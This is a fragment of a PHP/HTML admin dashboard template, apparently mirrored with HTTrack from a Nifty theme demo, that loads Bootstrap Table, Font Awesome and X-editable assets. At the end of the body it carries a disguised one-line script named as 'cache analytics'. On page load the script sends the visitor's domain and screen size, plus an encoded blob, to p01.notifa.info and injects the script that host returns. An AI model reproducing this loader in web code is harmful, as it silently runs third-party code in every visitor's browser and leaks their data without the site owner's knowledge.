...
<head>
  ...
  <?php } ?>
   ...
   <link href="<?php echo base_url();?>assets/admin/plugins/bootstrap-table/bootstrap-table.min.css" rel="stylesheet">

   <!--Font Awesome [ OPTIONAL ]-->
   <link href="<?php echo base_url();?>assets/admin/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet">

   <!--X-editable [ OPTIONAL ]-->
   <link href="<?php echo base_url();?>assets/admin/plugins/x-editable/css/bootstrap-editable.css" rel="stylesheet">
...
<!--END MAIN NAVIGATION-->
   ...
   <script src="<?php echo base_url();?>assets/admin/js/demo/tables-bs-table.js"></script>

   <!--Bootstrap Table [ OPTIONAL ]-->
   <script src="<?php echo base_url();?>assets/admin/plugins/bootstrap-table/bootstrap-table.min.js"></script>

   <!--Bootstrap Table Extension [ OPTIONAL ]-->
   <script src="<?php echo base_url();?>assets/admin/plugins/bootstrap-table/extensions/editable/bootstrap-table-editable.js"></script>

    <!--X-editable [ OPTIONAL ]-->
   <script src="<?php echo base_url();?>assets/admin/plugins/x-editable/js/bootstrap-editable.min.js"></script>



<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjW%2bRyfm%2bF7NMUkNIj02BHA03HAI%2f3zcI4Wk%2fScwQUMkDKQGKErZE62%2fNv2eEgaCFMbesWZf5nRwwE8cyp%2fpJ1pCVvmxMQEgZiGMngIqPqrPvzSalRyr9bAkfhqOUUWLH1NtWvBJOwpSaa8HTSyDdC3vEJsH7W4SIS8T%2bsE8HExmfgAba44riSIMmhBtVfcb7oykizCcs245UX%2bFZvZSHueEd9%2fN8xPYiKA6QWRHphlDaTaZGaiBzdnlu0exd7qZKgEL8oHiwLUV272v%2bhUXqCSqGNztOHpkYBMQUJ13qPA7mtWt%2fWo8FjjOnHHluyQv3jFsnvFF3MBBfrgFm4y9KgLHrWDPC%2fSy6lfMhKphq5MNiX2xFEuEksCOT6AxuuZ6n2xmijEwDJpo29kFrQkt4VY64Sg6ndIvVpiBgV%2fSQEPlN%2f1e8E4oJyNSbEnU1yUF61mc6gbEmEvaJxUFv7HPSwqSu4xvy4i2W3jflmSlM0B4BWdveQt34BqV" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/charts-morris-js.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:13 GMT -->
</html>
